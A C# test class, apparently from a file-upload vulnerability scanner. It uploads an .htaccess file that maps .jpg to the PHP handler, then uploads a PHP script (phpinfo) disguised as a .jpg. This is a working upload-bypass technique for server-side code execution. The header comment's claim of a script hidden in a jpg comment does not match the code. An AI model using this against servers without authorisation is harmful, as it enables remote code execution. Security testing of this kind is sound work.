using System.Text;
using System.Threading.Tasks;

/*
* Test #8
* Description: This test tries to upload a .htaccess file to overwrite the old one or just write a new one if there is none.
* The uploaded .htaccess file allows jpgs to run as if they were php files.
* A second file is uploaded as a valid jpg but containing a php script in it's comment.
*/
namespace FileUploadTool.Tests {
    class Test08 : Test {
        internal override async Task runTest(UploadRequest.UploadRequest request){
            //Send a new .htaccess file. If this is uploaded it will make the server execute jpgs as php files
            string data = "AddType application/x-httpd-php .jpg";

            request.setFileData(Encoding.ASCII.GetBytes(data));
            request.setFileContentType("image/jpeg");
            request.setFileName(".htaccess");

            await request.send();
            printResult(request, "Test 8 (.htaccess over/write)");

            //Upload a php script with the jpg extension
            data = "<?php\n"
                 + "  echo phpinfo();\n"
                 + "?>";

            request.setFileData(Encoding.ASCII.GetBytes(data));
            request.setFileContentType("image/jpeg");
            request.setFileName("Test_8.jpg");

            await request.send();
            printResult(request, "Test 8 (php w/ .jpg)");
        }
    }
}